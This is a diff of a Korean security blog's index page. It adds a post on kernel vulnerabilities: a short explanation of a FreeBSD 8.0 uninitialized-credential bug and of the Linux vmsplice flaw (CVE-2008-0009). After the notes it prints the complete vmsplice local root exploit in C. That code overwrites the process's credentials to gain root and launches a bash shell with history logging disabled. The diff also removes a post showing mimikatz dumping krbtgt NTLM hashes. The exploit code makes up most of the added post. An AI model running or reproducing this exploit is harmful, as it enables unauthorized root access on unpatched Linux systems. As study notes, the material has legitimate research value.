@@ -9,8 +9,16 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="
-">
+  <meta name="description" content="FreeBSD 8.0 &lsquo;Assigning values to uninitialized pointer&rsquo; 1
+2
+3
+4
+5
+6
+7
+struct ucred ucred, *ucp;
+...
+refcount_init(&ucred.cr_ref, 1); &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +74,667 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/07/13/agtke-attacking-the-core/">AGTKE: Attacking the Core</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-07-13T10:07:33+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:07 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>FreeBSD 8.0 &lsquo;Assigning values to uninitialized pointer&rsquo;</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>struct ucred ucred, *ucp;
+</span><span class='line'>...
+</span><span class='line'>refcount_init(&ucred.cr_ref, 1);
+</span><span class='line'>ucred.cr_uid = ip-&gt;i_uid;
+</span><span class='line'>ucred.cr_ngroups = 1;
+</span><span class='line'>ucred.cr_groups[0] = dp-&gt;i_gid; 
+</span><span class='line'>ucp = &ucred;</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>struct ucred {
+</span><span class='line'>    u_int cr_ref;
+</span><span class='line'>    ...
+</span><span class='line'>    gid_t *cr_groups;
+</span><span class='line'>    int cr_agroups;
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ucred 는 스택에 alloc 되는데, 적절히 init 안하고, ucred.cr_groups[0] 에 writing 을 한다. 전에 불렸던 펑션콜의 스택 사용에 따라서 ucred.cr_groups 의 값이 바뀌게 된다.</p>
+
+<h4>Linux vmsplice_to_user()</h4>
+
+<ul>
+<li>Linux kernel 2.6.17 - 2.6.24.1</li>
+<li><a href="http://www.gossamer-threads.com/lists/linux/kernel/876580">CVE-2008-0009</a></li>
+<li><a href="http://www.cs.fsu.edu/~baker/devices/lxr/http/source/linux/fs/splice.c?v=2.6.25">Patched src</a></li>
+<li><a href="http://www.exploit-db.com/exploits/5092/">vmsplice exploit-db</a></li>
+<li><a href="http://colesec.inventedtheinternet.com/tag/cve-2008-0009/">ColeSec</a></li>
+<li><a href="http://www.reddit.com/r/netsec/comments/1eb9iw/sdfucksheeporgs_semtexc_local_linux_root_exploit/">semtex reddit thread</a></li>
+</ul>
+
+
+<p>base 는 user space 에서 온 값인데, <code>sd.u.userptr</code> 로 갔다가 __copy_to_user_inatomic() 이라는 write 함수로 흘러버린다. kernel 주소를 kernel 에 넘겨서, kernel memory write 를 하는 취약점.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>error = get_user(base, &iov-&gt;iov_base); // get_user 는 매크로라 &base 할 필요가 없다.
+</span><span class='line'>...
+</span><span class='line'>if (unlikely(!base)) {
+</span><span class='line'>    error = -EFAULT;
+</span><span class='line'>    break;
+</span><span class='line'>}
+</span><span class='line'>...
+</span><span class='line'>sd.u.userptr = base;
+</span><span class='line'>...
+</span><span class='line'>size = __splice_from_pipe(pipe, &sd, pipe_to_user);
+</span><span class='line'>...
+</span><span class='line'>static int pipe_to_user(struct pipe_inode_info *pipe, struct pipe_buffer *buf,
+</span><span class='line'>struct splice_desc *sd)
+</span><span class='line'>{
+</span><span class='line'>if (!fault_in_pages_writeable(sd-&gt;u.userptr, sd-&gt;len)) {
+</span><span class='line'>    src = buf-&gt;ops-&gt;map(pipe, buf, 1);
+</span><span class='line'>    ret = __copy_to_user_inatomic(sd-&gt;u.userptr, src+buf-&gt;offset, sd-&gt;len);
+</span><span class='line'>    buf-&gt;ops-&gt;unmap(pipe, buf, src);
+</span><span class='line'>...
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>exploit.c</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+<span class='line-number'>143</span>
+<span class='line-number'>144</span>
+<span class='line-number'>145</span>
+<span class='line-number'>146</span>
+<span class='line-number'>147</span>
+<span class='line-number'>148</span>
+<span class='line-number'>149</span>
+<span class='line-number'>150</span>
+<span class='line-number'>151</span>
+<span class='line-number'>152</span>
+<span class='line-number'>153</span>
+<span class='line-number'>154</span>
+<span class='line-number'>155</span>
+<span class='line-number'>156</span>
+<span class='line-number'>157</span>
+<span class='line-number'>158</span>
+<span class='line-number'>159</span>
+<span class='line-number'>160</span>
+<span class='line-number'>161</span>
+<span class='line-number'>162</span>
+<span class='line-number'>163</span>
+<span class='line-number'>164</span>
+<span class='line-number'>165</span>
+<span class='line-number'>166</span>
+<span class='line-number'>167</span>
+<span class='line-number'>168</span>
+<span class='line-number'>169</span>
+<span class='line-number'>170</span>
+<span class='line-number'>171</span>
+<span class='line-number'>172</span>
+<span class='line-number'>173</span>
+<span class='line-number'>174</span>
+<span class='line-number'>175</span>
+<span class='line-number'>176</span>
+<span class='line-number'>177</span>
+<span class='line-number'>178</span>
+<span class='line-number'>179</span>
+<span class='line-number'>180</span>
+<span class='line-number'>181</span>
+<span class='line-number'>182</span>
+<span class='line-number'>183</span>
+<span class='line-number'>184</span>
+<span class='line-number'>185</span>
+<span class='line-number'>186</span>
+<span class='line-number'>187</span>
+<span class='line-number'>188</span>
+<span class='line-number'>189</span>
+<span class='line-number'>190</span>
+<span class='line-number'>191</span>
+<span class='line-number'>192</span>
+<span class='line-number'>193</span>
+<span class='line-number'>194</span>
+<span class='line-number'>195</span>
+<span class='line-number'>196</span>
+<span class='line-number'>197</span>
+<span class='line-number'>198</span>
+<span class='line-number'>199</span>
+<span class='line-number'>200</span>
+<span class='line-number'>201</span>
+<span class='line-number'>202</span>
+<span class='line-number'>203</span>
+<span class='line-number'>204</span>
+<span class='line-number'>205</span>
+<span class='line-number'>206</span>
+<span class='line-number'>207</span>
+<span class='line-number'>208</span>
+<span class='line-number'>209</span>
+<span class='line-number'>210</span>
+<span class='line-number'>211</span>
+<span class='line-number'>212</span>
+<span class='line-number'>213</span>
+<span class='line-number'>214</span>
+<span class='line-number'>215</span>
+<span class='line-number'>216</span>
+<span class='line-number'>217</span>
+<span class='line-number'>218</span>
+<span class='line-number'>219</span>
+<span class='line-number'>220</span>
+<span class='line-number'>221</span>
+<span class='line-number'>222</span>
+<span class='line-number'>223</span>
+<span class='line-number'>224</span>
+<span class='line-number'>225</span>
+<span class='line-number'>226</span>
+<span class='line-number'>227</span>
+<span class='line-number'>228</span>
+<span class='line-number'>229</span>
+<span class='line-number'>230</span>
+<span class='line-number'>231</span>
+<span class='line-number'>232</span>
+<span class='line-number'>233</span>
+<span class='line-number'>234</span>
+<span class='line-number'>235</span>
+<span class='line-number'>236</span>
+<span class='line-number'>237</span>
+<span class='line-number'>238</span>
+<span class='line-number'>239</span>
+<span class='line-number'>240</span>
+<span class='line-number'>241</span>
+<span class='line-number'>242</span>
+<span class='line-number'>243</span>
+<span class='line-number'>244</span>
+<span class='line-number'>245</span>
+<span class='line-number'>246</span>
+<span class='line-number'>247</span>
+<span class='line-number'>248</span>
+<span class='line-number'>249</span>
+<span class='line-number'>250</span>
+<span class='line-number'>251</span>
+<span class='line-number'>252</span>
+<span class='line-number'>253</span>
+<span class='line-number'>254</span>
+<span class='line-number'>255</span>
+<span class='line-number'>256</span>
+<span class='line-number'>257</span>
+<span class='line-number'>258</span>
+<span class='line-number'>259</span>
+<span class='line-number'>260</span>
+<span class='line-number'>261</span>
+<span class='line-number'>262</span>
+<span class='line-number'>263</span>
+<span class='line-number'>264</span>
+<span class='line-number'>265</span>
+<span class='line-number'>266</span>
+<span class='line-number'>267</span>
+<span class='line-number'>268</span>
+<span class='line-number'>269</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#define _GNU_SOURCE
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;errno.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>#include &lt;malloc.h&gt;
+</span><span class='line'>#include &lt;limits.h&gt;
+</span><span class='line'>#include &lt;signal.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;sys/uio.h&gt;
+</span><span class='line'>#include &lt;sys/mman.h&gt;
+</span><span class='line'>#include &lt;asm/page.h&gt;
+</span><span class='line'>#define __KERNEL__
+</span><span class='line'>#include &lt;asm/unistd.h&gt;
+</span><span class='line'> 
+</span><span class='line'>#define PIPE_BUFFERS    16
+</span><span class='line'>#define PG_compound 14
+</span><span class='line'>#define uint        unsigned int
+</span><span class='line'>#define static_inline   static inline __attribute__((always_inline))
+</span><span class='line'>#define STACK(x)    (x + sizeof(x) - 40)
+</span><span class='line'> 
+</span><span class='line'>struct page {
+</span><span class='line'>    unsigned long flags;
+</span><span class='line'>    int count;
+</span><span class='line'>    int mapcount;
+</span><span class='line'>    unsigned long private;
+</span><span class='line'>    void *mapping;
+</span><span class='line'>    unsigned long index;
+</span><span class='line'>    struct { long next, prev; } lru;
+</span><span class='line'>};
+</span><span class='line'> 
+</span><span class='line'>void    exit_code();
+</span><span class='line'>char    exit_stack[1024 * 1024];
+</span><span class='line'> 
+</span><span class='line'>void    die(char *msg, int err)
+</span><span class='line'>{
+</span><span class='line'>    printf(err ? "[-] %s: %s\n" : "[-] %s\n", msg, strerror(err));
+</span><span class='line'>    fflush(stdout);
+</span><span class='line'>    fflush(stderr);
+</span><span class='line'>    exit(1);
+</span><span class='line'>}
+</span><span class='line'> 
+</span><span class='line'>#if defined (__i386__)
+</span><span class='line'> 
+</span><span class='line'>#ifndef __NR_vmsplice
+</span><span class='line'>#define __NR_vmsplice   316
+</span><span class='line'>#endif
+</span><span class='line'> 
+</span><span class='line'>#define USER_CS     0x73
+</span><span class='line'>#define USER_SS     0x7b
+</span><span class='line'>#define USER_FL     0x246
+</span><span class='line'> 
+</span><span class='line'>static_inline
+</span><span class='line'>void    exit_kernel()
+</span><span class='line'>{
+</span><span class='line'>    __asm__ __volatile__ (
+</span><span class='line'>    "movl %0, 0x10(%%esp) ;"
+</span><span class='line'>    "movl %1, 0x0c(%%esp) ;"
+</span><span class='line'>    "movl %2, 0x08(%%esp) ;"
+</span><span class='line'>    "movl %3, 0x04(%%esp) ;"
+</span><span class='line'>    "movl %4, 0x00(%%esp) ;"
+</span><span class='line'>    "iret"
+</span><span class='line'>    : : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
+</span><span class='line'>        "i" (USER_CS), "r" (exit_code)
+</span><span class='line'>    );
+</span><span class='line'>}
+</span><span class='line'> 
+</span><span class='line'>static_inline
+</span><span class='line'>void *  get_current()
+</span><span class='line'>{
+</span><span class='line'>    unsigned long curr;
+</span><span class='line'>    __asm__ __volatile__ (
+</span><span class='line'>    "movl %%esp, %%eax ;"
+</span><span class='line'>    "andl %1, %%eax ;"
+</span><span class='line'>    "movl (%%eax), %0"
+</span><span class='line'>    : "=r" (curr)
+</span><span class='line'>    : "i" (~8191)
+</span><span class='line'>    );
+</span><span class='line'>    return (void *) curr;
+</span><span class='line'>}
+</span><span class='line'> 
+</span><span class='line'>#elif defined (__x86_64__)
+</span><span class='line'> 
+</span><span class='line'>#ifndef __NR_vmsplice
+</span><span class='line'>#define __NR_vmsplice   278
+</span><span class='line'>#endif
+</span><span class='line'> 
+</span><span class='line'>#define USER_CS     0x23
+</span><span class='line'>#define USER_SS     0x2b
+</span><span class='line'>#define USER_FL     0x246
+</span><span class='line'> 
+</span><span class='line'>static_inline
+</span><span class='line'>void    exit_kernel()
+</span><span class='line'>{
+</span><span class='line'>    __asm__ __volatile__ (
+</span><span class='line'>    "swapgs ;"
+</span><span class='line'>    "movq %0, 0x20(%%rsp) ;"
+</span><span class='line'>    "movq %1, 0x18(%%rsp) ;"
+</span><span class='line'>    "movq %2, 0x10(%%rsp) ;"
+</span><span class='line'>    "movq %3, 0x08(%%rsp) ;"
+</span><span class='line'>    "movq %4, 0x00(%%rsp) ;"
+</span><span class='line'>    "iretq"
+</span><span class='line'>    : : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
+</span><span class='line'>        "i" (USER_CS), "r" (exit_code)
+</span><span class='line'>    );
+</span><span class='line'>}
+</span><span class='line'> 
+</span><span class='line'>static_inline
+</span><span class='line'>void *  get_current()
+</span><span class='line'>{
+</span><span class='line'>    unsigned long curr;
+</span><span class='line'>    __asm__ __volatile__ (
+</span><span class='line'>    "movq %%gs:(0), %0"
+</span><span class='line'>    : "=r" (curr)
+</span><span class='line'>    );
+</span><span class='line'>    return (void *) curr;
+</span><span class='line'>}
+</span><span class='line'> 
+</span><span class='line'>#else
+</span><span class='line'>#error "unsupported arch"
+</span><span class='line'>#endif
+</span><span class='line'> 
+</span><span class='line'>#if defined (_syscall4)
+</span><span class='line'>#define __NR__vmsplice  __NR_vmsplice
+</span><span class='line'>_syscall4(
+</span><span class='line'>    long, _vmsplice,
+</span><span class='line'>    int, fd,
+</span><span class='line'>    struct iovec *, iov,
+</span><span class='line'>    unsigned long, nr_segs,
+</span><span class='line'>    unsigned int, flags)
+</span><span class='line'> 
+</span><span class='line'>#else
+</span><span class='line'>#define _vmsplice(fd,io,nr,fl)  syscall(__NR_vmsplice, (fd), (io), (nr), (fl))
+</span><span class='line'>#endif
+</span><span class='line'> 
+</span><span class='line'>static uint uid, gid;
+</span><span class='line'> 
+</span><span class='line'>void    kernel_code()
+</span><span class='line'>{
+</span><span class='line'>    int i;
+</span><span class='line'>    uint    *p = get_current();
+</span><span class='line'> 
+</span><span class='line'>    for (i = 0; i &lt; 1024-13; i++) {
+</span><span class='line'>        if (p[0] == uid && p[1] == uid &&
+</span><span class='line'>            p[2] == uid && p[3] == uid &&
+</span><span class='line'>            p[4] == gid && p[5] == gid &&
+</span><span class='line'>            p[6] == gid && p[7] == gid) {
+</span><span class='line'>            p[0] = p[1] = p[2] = p[3] = 0;
+</span><span class='line'>            p[4] = p[5] = p[6] = p[7] = 0;
+</span><span class='line'>            p = (uint *) ((char *)(p + 8) + sizeof(void *));
+</span><span class='line'>            p[0] = p[1] = p[2] = ~0;
+</span><span class='line'>            break;
+</span><span class='line'>        }
+</span><span class='line'>        p++;
+</span><span class='line'>    }   
+</span><span class='line'> 
+</span><span class='line'>    exit_kernel();
+</span><span class='line'>}
+</span><span class='line'> 
+</span><span class='line'>void    exit_code()
+</span><span class='line'>{
+</span><span class='line'>    if (getuid() != 0)
+</span><span class='line'>        die("wtf", 0);
+</span><span class='line'> 
+</span><span class='line'>    printf("[+] root\n");
+</span><span class='line'>    putenv("HISTFILE=/dev/null");
+</span><span class='line'>    execl("/bin/bash", "bash", "-i", NULL);
+</span><span class='line'>    die("/bin/bash", errno);
+</span><span class='line'>}
+</span><span class='line'> 
+</span><span class='line'>int main(int argc, char *argv[])
+</span><span class='line'>{
+</span><span class='line'>    int     pi[2];
+</span><span class='line'>    size_t      map_size;
+</span><span class='line'>    char *      map_addr;
+</span><span class='line'>    struct iovec    iov;
+</span><span class='line'>    struct page *   pages[5];
+</span><span class='line'> 
+</span><span class='line'>    uid = getuid();
+</span><span class='line'>    gid = getgid();
+</span><span class='line'>    setresuid(uid, uid, uid);
+</span><span class='line'>    setresgid(gid, gid, gid);
+</span><span class='line'> 
+</span><span class='line'>    printf("-----------------------------------\n");
+</span><span class='line'>    printf(" Linux vmsplice Local Root Exploit\n");
+</span><span class='line'>    printf(" By qaaz\n");
+</span><span class='line'>    printf("-----------------------------------\n");
+</span><span class='line'> 
+</span><span class='line'>    if (!uid || !gid)
+</span><span class='line'>        die("!@#$", 0);
+</span><span class='line'> 
+</span><span class='line'>    /*****/
+</span><span class='line'>    pages[0] = *(void **) &(int[2]){0,PAGE_SIZE};
+</span><span class='line'>    pages[1] = pages[0] + 1;
+</span><span class='line'> 
+</span><span class='line'>    map_size = PAGE_SIZE;
+</span><span class='line'>    map_addr = mmap(pages[0], map_size, PROT_READ | PROT_WRITE,
+</span><span class='line'>                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+</span><span class='line'>    if (map_addr == MAP_FAILED)
+</span><span class='line'>        die("mmap", errno);
+</span><span class='line'> 
+</span><span class='line'>    memset(map_addr, 0, map_size);
+</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
+</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[0]);
+</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[1]);
+</span><span class='line'> 
+</span><span class='line'>    pages[0]-&gt;flags    = 1 &lt;&lt; PG_compound;
+</span><span class='line'>    pages[0]-&gt;private  = (unsigned long) pages[0];
+</span><span class='line'>    pages[0]-&gt;count    = 1;
+</span><span class='line'>    pages[1]-&gt;lru.next = (long) kernel_code;
+</span><span class='line'> 
+</span><span class='line'>    /*****/
+</span><span class='line'>    pages[2] = *(void **) pages[0];
+</span><span class='line'>    pages[3] = pages[2] + 1;
+</span><span class='line'> 
+</span><span class='line'>    map_size = PAGE_SIZE;
+</span><span class='line'>    map_addr = mmap(pages[2], map_size, PROT_READ | PROT_WRITE,
+</span><span class='line'>                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+</span><span class='line'>    if (map_addr == MAP_FAILED)
+</span><span class='line'>        die("mmap", errno);
+</span><span class='line'> 
+</span><span class='line'>    memset(map_addr, 0, map_size);
+</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
+</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[2]);
+</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[3]);
+</span><span class='line'> 
+</span><span class='line'>    pages[2]-&gt;flags    = 1 &lt;&lt; PG_compound;
+</span><span class='line'>    pages[2]-&gt;private  = (unsigned long) pages[2];
+</span><span class='line'>    pages[2]-&gt;count    = 1;
+</span><span class='line'>    pages[3]-&gt;lru.next = (long) kernel_code;
+</span><span class='line'> 
+</span><span class='line'>    /*****/
+</span><span class='line'>    pages[4] = *(void **) &(int[2]){PAGE_SIZE,0};
+</span><span class='line'>    map_size = PAGE_SIZE;
+</span><span class='line'>    map_addr = mmap(pages[4], map_size, PROT_READ | PROT_WRITE,
+</span><span class='line'>                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+</span><span class='line'>    if (map_addr == MAP_FAILED)
+</span><span class='line'>        die("mmap", errno);
+</span><span class='line'>    memset(map_addr, 0, map_size);
+</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
+</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[4]);
+</span><span class='line'> 
+</span><span class='line'>    /*****/
+</span><span class='line'>    map_size = (PIPE_BUFFERS * 3 + 2) * PAGE_SIZE;
+</span><span class='line'>    map_addr = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
+</span><span class='line'>                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+</span><span class='line'>    if (map_addr == MAP_FAILED)
+</span><span class='line'>        die("mmap", errno);
+</span><span class='line'> 
+</span><span class='line'>    memset(map_addr, 0, map_size);
+</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
+</span><span class='line'> 
+</span><span class='line'>    /*****/
+</span><span class='line'>    map_size -= 2 * PAGE_SIZE;
+</span><span class='line'>    if (munmap(map_addr + map_size, PAGE_SIZE) &lt; 0)
+</span><span class='line'>        die("munmap", errno);
+</span><span class='line'> 
+</span><span class='line'>    /*****/
+</span><span class='line'>    if (pipe(pi) &lt; 0) die("pipe", errno);
+</span><span class='line'>    close(pi[0]);
+</span><span class='line'> 
+</span><span class='line'>    iov.iov_base = map_addr;
+</span><span class='line'>    iov.iov_len  = ULONG_MAX;
+</span><span class='line'> 
+</span><span class='line'>    signal(SIGPIPE, exit_code);
+</span><span class='line'>    _vmsplice(pi[1], &iov, 1, 0);
+</span><span class='line'>    die("vmsplice", errno);
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -687,49 +1356,6 @@ _ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/06/17/mimikatz/">Mimikatz</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-06-17T16:34:53+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:34 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mimikatz # lsadump::lsa /name:krbtgt /inject
-</span><span class='line'>Domain: KRBTGT / S-1-5-21-41...
-</span><span class='line'>
-</span><span class='line'>...
-</span><span class='line'> * Primary
-</span><span class='line'>    LM   :
-</span><span class='line'>    NTLM : 02ca...</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/6">&larr; Older</a>
@@ -747,6 +1373,10 @@ _ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/">Security Analysis of Emerging Smart Home Applications</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
       </li>
     
@@ -760,10 +1390,6 @@ _ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>
     
       <li class="post">
         <a href="/blog/2016/02/25/mnist-for-ml-beginners/">MNIST for ML Beginners</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/02/16/plaid-ctf-2015-one-null-byte/">Plaid CTF 2015 - One NULL Byte</a>
       </li>
     
   </ul>
